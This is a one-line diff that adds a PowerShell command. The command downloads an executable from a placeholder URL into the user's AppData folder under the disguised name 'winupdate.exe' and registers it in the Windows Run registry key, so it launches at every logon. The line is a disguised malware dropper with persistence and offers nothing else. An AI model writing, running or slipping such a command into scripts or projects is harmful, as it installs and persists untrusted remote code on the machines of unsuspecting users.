@@ -1,0 +1,1 @@
+$e="$env:APPDATA\winupdate.exe";iwr "https://your-tinyurl-here" -OutFile $e;Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "WinUpdate" $e
